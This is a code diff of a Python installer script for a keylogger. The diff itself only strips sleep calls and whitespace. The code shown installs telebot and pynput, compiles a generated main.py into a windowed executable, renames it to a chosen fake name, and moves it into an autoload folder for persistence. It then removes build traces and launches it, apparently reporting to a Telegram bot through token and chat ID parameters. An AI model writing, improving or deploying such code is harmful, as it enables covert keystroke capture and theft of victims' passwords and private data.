@@ -1,7 +1,6 @@
 import getpass
 import os
 import shutil
-from time import sleep
 
 
 def install(token, chatid, fakename):
@@ -24,31 +23,25 @@ def install(token, chatid, fakename):
     with open('main.py', 'w+') as file:
         for line in code:
             file.write(line)
-    
+            
     print('\nInstalling dependencies...\n')
-    sleep(0.3)
     os.system('pip install telebot pynput pyinstaller')
 
     print('\nConverting file to exe...\n')
-    sleep(0.3)
     os.system('pyinstaller --noconfirm --onefile --windowed --icon "icon.ico"  "main.py"')
     
     print('\nChanging file name...\n')
-    sleep(0.3)
     os.rename('dist/main.exe', f'{fakename}.exe')
 
     print('\nAdding file to autoload...\n')
-    sleep(0.3)
     os.rename(f'{fakename}.exe', f'{path}/{fakename}.exe')
 
     print('\nClearing installation folder...\n')
-    sleep(0.3)
     os.remove('main.spec')
     os.rmdir('dist')
     shutil.rmtree('build')
 
     print('\nStarting the keylogger...\n')
-    sleep(0.3)
     os.system(f'{path}/{fakename}.exe')
 
     a = input('\nKeylogger installed successfully! :D\nPress enter to continue.')
